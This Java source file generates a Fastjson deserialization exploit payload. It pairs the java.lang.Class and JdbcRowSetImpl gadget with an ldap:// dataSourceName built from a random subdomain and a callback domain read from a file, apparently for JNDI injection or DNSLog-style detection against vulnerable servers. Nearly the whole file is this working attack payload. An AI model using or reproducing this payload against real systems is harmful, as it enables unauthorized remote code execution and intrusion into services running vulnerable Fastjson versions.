import Utilss.shell;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Random;

public class Test {

    public static void main(String[] args) {
        String a = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://" + shell.getRandomString() + "." + shell.readFile(shell.dnspath).replace("http://","") + "/\",\"autoCommit\":true},\"hfe4zyyzldp\":\"=\"}";
        System.out.println(a);
    }

    //length用户要求产生字符串的长度
    public static String getRandomString(int length){
        String str="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        Random random=new Random();
        StringBuffer sb=new StringBuffer();
        for(int i=0;i<length;i++){
            int number=random.nextInt(62);
            sb.append(str.charAt(number));
        }
        return sb.toString();
    }
}